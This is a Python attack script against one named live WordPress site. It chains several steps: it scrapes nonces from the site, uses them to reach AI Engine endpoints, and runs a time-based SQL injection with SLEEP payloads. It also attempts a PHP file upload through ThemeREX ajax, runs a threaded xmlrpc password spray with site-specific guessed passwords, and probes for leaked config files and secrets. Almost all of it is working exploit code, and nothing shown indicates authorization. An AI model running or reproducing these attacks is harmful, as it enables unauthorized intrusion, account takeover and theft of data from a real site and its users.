#!/usr/bin/env python3
"""Critical wave3: guest nonces -> MWAI/Wishlist, MCP CVE path, Jetpack, xmlrpc, Afrihost."""
from __future__ import annotations

import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

results = {
    "ts": time.time(),
    "confirmed": [],
    "leads": [],
    "vectors": {},
}


def http(method, url, data=None, headers=None, timeout=30):
    h = {"User-Agent": "Mozilla/5.0 lurksek-wave3", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def note(vec, entry):
    results["vectors"].setdefault(vec, []).append(entry)
    print(f"[{vec}] {entry}", flush=True)


def extract_nonces():
    code, t, body, _ = http("GET", TARGET + "/", timeout=45)
    html = body.decode("utf-8", "replace")
    nonces = {}
    for lab, pat in [
        ("tinvwl", r"ti_wishlist_data_[^\"]+\"[^\}]*\"nonce\"\s*:\s*\"([a-f0-9]+)\""),
        ("tinvwl2", r"\"nonce\"\s*:\s*\"([a-f0-9]+)\"[^\}]*\"rest_root\""),
        ("trx_ajax", r"\"ajax_nonce\"\s*:\s*\"([a-f0-9]+)\""),
        ("sr7", r"SR7\.E\.nonce\s*=\s*['\"]([a-f0-9]+)['\"]"),
        ("wpApi", r"wpApiSettings\s*=\s*\{[^\}]*nonce['\"]?\s*:\s*['\"]([a-f0-9]+)['\"]"),
        ("restNonce", r"restNonce['\"]?\s*[:=]\s*['\"]([a-f0-9]+)['\"]"),
        ("generic", r"\"nonce\"\s*:\s*\"([a-f0-9]{8,12})\""),
    ]:
        ms = re.findall(pat, html, re.I)
        if ms:
            nonces[lab] = list(dict.fromkeys(ms))
    # also wishlist page
    code2, _, body2, _ = http("GET", TARGET + "/?p=6130", timeout=40)
    html2 = body2.decode("utf-8", "replace")
    for lab, pat in [
        ("tinvwl_p6130", r"\"nonce\"\s*:\s*\"([a-f0-9]+)\"[^\}]*\"rest_root\""),
        ("trx_p6130", r"\"ajax_nonce\"\s*:\s*\"([a-f0-9]+)\""),
    ]:
        ms = re.findall(pat, html2, re.I)
        if ms:
            nonces[lab] = list(dict.fromkeys(ms))
    results["vectors"]["nonce_extract"] = {"home_code": code, "home_len": len(html), "nonces": nonces}
    print("NONCES", nonces, flush=True)
    flat = []
    for vs in nonces.values():
        flat.extend(vs)
    # known fallbacks from prior recon
    for n in ["026c7d7139", "407a574df0", "54b96dfe24", "f15828810a", "09854a883a", "08bbf42fbe"]:
        flat.append(n)
    return list(dict.fromkeys(flat)), html


def smash_mcp():
    print("=== MCP / CVE-2025-11749 path ===", flush=True)
    for path in [
        "/wp-json/mcp/v1",
        "/wp-json/mcp/v1/",
        "/?rest_route=/mcp/v1",
        "/wp-json/mwai/v1/mcp",
        "/wp-json/ai-engine/v1/mcp",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=20)
        text = body[:200].decode("utf-8", "replace")
        note("mcp", {"path": path, "code": code, "body": text})
        if code == 200 and ("bearer" in text.lower() or "token" in text.lower() or "mcp" in text.lower()):
            results["leads"].append({"vector": "mcp", "path": path, "body": text})
            if "bearer" in text.lower() or "token" in text.lower():
                results["confirmed"].append({"type": "CVE-2025-11749-like", "path": path, "body": text[:500]})


def smash_mwai_with_nonces(nonces):
    print("=== MWAI with guest nonces ===", flush=True)
    endpoints = [
        ("GET", "/wp-json/mwai/v1/models", None, None),
        ("GET", "/wp-json/mwai-ui/v1/files", None, None),
        (
            "POST",
            "/wp-json/mwai-ui/v1/files/upload",
            None,  # multipart built below
            "multipart",
        ),
        (
            "POST",
            "/wp-json/mwai-ui/v1/chats/submit",
            json.dumps({"message": "ping", "botId": "default", "chatId": "wave3", "sessionId": "wave3"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "POST",
            "/wp-json/mwai/v1/simpleChatbotQuery",
            json.dumps({"message": "ping", "botId": "default"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "POST",
            "/wp-json/mwai/v1/simpleTextQuery",
            json.dumps({"message": "ping"}).encode(),
            {"Content-Type": "application/json"},
        ),
    ]
    # include empty nonce baseline
    test_nonces = [None] + nonces[:8]
    for nonce in test_nonces:
        for method, path, data, headers in endpoints:
            hdrs = {}
            if isinstance(headers, dict):
                hdrs.update(headers)
            if nonce:
                hdrs["X-WP-Nonce"] = nonce
            body_data = data
            if headers == "multipart":
                boundary = "----W3" + uuid.uuid4().hex[:8]
                body_data = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="t.txt"\r\n'
                    f"Content-Type: text/plain\r\n\r\nhi\r\n"
                    f"--{boundary}--\r\n"
                ).encode()
                hdrs["Content-Type"] = f"multipart/form-data; boundary={boundary}"
            code, t, body, _ = http(method, TARGET + path, data=body_data, headers=hdrs, timeout=25)
            text = body[:180].decode("utf-8", "replace")
            entry = {
                "nonce": nonce,
                "path": path,
                "method": method,
                "code": code,
                "body": text,
            }
            note("mwai_nonce", entry)
            if code in (200, 201) and any(
                k in text.lower() for k in ["success", "url", "file", "answer", "data", "id"]
            ):
                results["leads"].append({"vector": "mwai_nonce", **entry})
                if "upload" in path or "file" in text.lower() or "answer" in text.lower():
                    results["confirmed"].append({"type": "mwai_guest_nonce_access", **entry})
                    print("CRITICAL_MWAI_NONCE", path, nonce, flush=True)


def smash_wishlist_add(nonces):
    print("=== Wishlist add_product with nonces (populate for SQLi) ===", flush=True)
    shares = ["bfa79e", "a4bc53", "e6b382", "c631be"]
    for nonce in [None] + nonces[:6]:
        for share in shares[:2]:
            for pid in [1, 2, 6130, 9000]:
                payload = json.dumps({"product_id": pid, "quantity": 1}).encode()
                hdrs = {"Content-Type": "application/json"}
                if nonce:
                    hdrs["X-WP-Nonce"] = nonce
                code, t, body, _ = http(
                    "POST",
                    f"{TARGET}/wp-json/wc/v3/wishlist/{share}/add_product",
                    data=payload,
                    headers=hdrs,
                    timeout=20,
                )
                text = body[:160].decode("utf-8", "replace")
                entry = {"nonce": nonce, "share": share, "pid": pid, "code": code, "body": text}
                if code not in (401, 403) or (nonce and code != 401):
                    note("wishlist_add", entry)
                if code in (200, 201) and ("product" in text.lower() or text.strip().startswith("{") or text.strip().startswith("[")):
                    results["leads"].append({"vector": "wishlist_add", **entry})
                    # check products
                    c2, _, b2, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{share}/get_products", timeout=20)
                    arr = []
                    try:
                        arr = json.loads(b2.decode("utf-8", "replace"))
                    except Exception:
                        pass
                    n = len(arr) if isinstance(arr, list) else -1
                    print(f"POPULATED? share={share} n={n}", flush=True)
                    if n and n > 0:
                        results["confirmed"].append(
                            {"type": "wishlist_populated_via_nonce", "share": share, "n": n, "nonce": nonce}
                        )
                        # quick SQLi
                        confirm_sqli(share)


def confirm_sqli(share):
    print("=== SQLi on populated", share, "===", flush=True)
    suite = []
    for lab, order in [
        ("ASC1", "ASC"),
        ("ASC2", "ASC"),
        ("S5a", ",(SELECT SLEEP(5))--"),
        ("S5b", ",(SELECT SLEEP(5))--"),
        ("S10a", ",(SELECT SLEEP(10))--"),
        ("S10b", ",(SELECT SLEEP(10))--"),
        ("ASC3", "ASC"),
    ]:
        q = urllib.parse.urlencode({"_method": "GET", "order": order})
        data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
        code, t, body, _ = http(
            "POST",
            f"{TARGET}/?{q}",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=90,
        )
        suite.append({"label": lab, "code": code, "time": round(t, 3)})
        print(f"SQLI {lab} {code} {t:.2f}", flush=True)
    asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
    s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
    s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
    if asc and s5 and s10:
        a = sorted(asc)[len(asc) // 2]
        if all(t >= a + 3.5 for t in s5) and all(t >= a + 8 for t in s10):
            results["confirmed"].append(
                {"type": "CVE-2024-43917", "share": share, "asc": asc, "s5": s5, "s10": s10}
            )
            print("CRITICAL_SQLI_CONFIRMED", flush=True)


def smash_jetpack():
    print("=== Jetpack ===", flush=True)
    for path in [
        "/wp-json/jetpack/v4/connection",
        "/wp-json/jetpack/v4/connection/data",
        "/wp-json/jetpack/v4/site",
        "/wp-json/jetpack/v4/plugins",
        "/xmlrpc.php?rsd",
        "/?rest_route=/jetpack/v4/connection",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=20)
        text = body[:200].decode("utf-8", "replace")
        note("jetpack", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text.lower() for k in ["blog_id", "access_token", "secret", "email", "master_user"]):
            results["leads"].append({"vector": "jetpack", "path": path, "body": text})
            if "access_token" in text.lower() or "secret" in text.lower():
                results["confirmed"].append({"type": "jetpack_secret_leak", "path": path, "body": text[:500]})


def smash_xmlrpc():
    print("=== xmlrpc spray ===", flush=True)
    users = ["Kznbk90iub0e", "admin", "kznemvifiv", "kznvip", "info"]
    passwords = [
        "Kznbk90iub0e",
        "kznemvifiv",
        "kznvip",
        "Kznvip1!",
        "Proguards1!",
        "Afrihost1!",
        "Password1!",
        "Welcome1!",
        "admin123",
        "P@ssw0rd1",
        "kznvip2024",
        "kznvip2025",
        "kznvip2026",
        "Security1!",
        "Guard123!",
    ]

    def try_pair(up):
        u, p = up
        xml = (
            '<?xml version="1.0"?>'
            "<methodCall><methodName>wp.getUsersBlogs</methodName>"
            f"<params><param><value><string>{u}</string></value></param>"
            f"<param><value><string>{p}</string></value></param></params></methodCall>"
        )
        code, t, body, _ = http(
            "POST",
            TARGET + "/xmlrpc.php",
            data=xml.encode(),
            headers={"Content-Type": "text/xml"},
            timeout=15,
        )
        text = body.decode("utf-8", "replace")
        hit = ("isAdmin" in text or "blogid" in text.lower()) and "fault" not in text.lower()
        return {"user": u, "pass": p, "code": code, "hit": hit, "body": text[:120]}

    pairs = [(u, p) for u in users for p in passwords]
    with ThreadPoolExecutor(max_workers=8) as ex:
        for r in ex.map(try_pair, pairs):
            if r["code"] != 0:
                note("xmlrpc", r)
            if r["hit"]:
                results["confirmed"].append({"type": "xmlrpc_weak_creds", **r})
                print("CRITICAL_XMLRPC", r["user"], r["pass"], flush=True)


def smash_afrihost():
    print("=== Afrihost / path ===", flush=True)
    for path in [
        "/wp-content/uploads/",
        "/wp-content/debug.log",
        "/.well-known/acme-challenge/",
        "/wp-config.php.bak",
        "/wp-config.php.save",
        "/error_log",
        "/cgi-bin/",
        "/server-status",
        "/phpmyadmin/",
        "/pma/",
        "/adminer.php",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=15)
        text = body[:150].decode("utf-8", "replace")
        note("afrihost", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text for k in ["Index of", "DB_PASSWORD", "kznemvifiv", "root@", "[core]"]):
            results["leads"].append({"vector": "afrihost", "path": path, "body": text})
            if "DB_PASSWORD" in text or "[core]" in text:
                results["confirmed"].append({"type": "source_leak", "path": path, "body": text[:500]})


def smash_trx_ajax(nonces):
    print("=== ThemeREX ajax with live nonces ===", flush=True)
    trx_nonces = [n for n in nonces if n][:4]
    for nonce in trx_nonces:
        for action in [
            "trx_addons_uploads_save_data",
            "trx_addons_importers_upload",
            "trx_addons_ajax_upload",
        ]:
            boundary = "----T" + uuid.uuid4().hex[:6]
            parts = []
            for k, v in [
                ("action", action),
                ("nonce", nonce),
                ("_ajax_nonce", nonce),
                ("name", "t.php"),
                ("data", "<?php echo 1; ?>"),
            ]:
                parts.append(
                    f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
                )
            parts.append(f"--{boundary}--\r\n".encode())
            code, t, body, _ = http(
                "POST",
                TARGET + "/wp-admin/admin-ajax.php",
                data=b"".join(parts),
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
                timeout=20,
            )
            text = body[:120].decode("utf-8", "replace")
            note("trx", {"action": action, "nonce": nonce, "code": code, "body": text})
            if code == 200 and text not in ("0", "-1") and "error" not in text.lower():
                results["leads"].append({"vector": "trx", "action": action, "body": text})


def main():
    nonces, _html = extract_nonces()
    smash_mcp()
    smash_mwai_with_nonces(nonces)
    smash_wishlist_add(nonces)
    smash_jetpack()
    smash_trx_ajax(nonces)
    smash_xmlrpc()
    smash_afrihost()
    results["confirmed_count"] = len(results["confirmed"])
    results["leads_count"] = len(results["leads"])
    for p in (OUT / "critical_wave3.json", Path("out/critical_wave3.json")):
        p.write_text(json.dumps(results, indent=2, default=str))
    print("DONE confirmed=", results["confirmed_count"], "leads=", results["leads_count"], flush=True)
    if results["confirmed"]:
        print("CRITICAL_CONFIRMED", json.dumps(results["confirmed"])[:2000], flush=True)


if __name__ == "__main__":
    main()
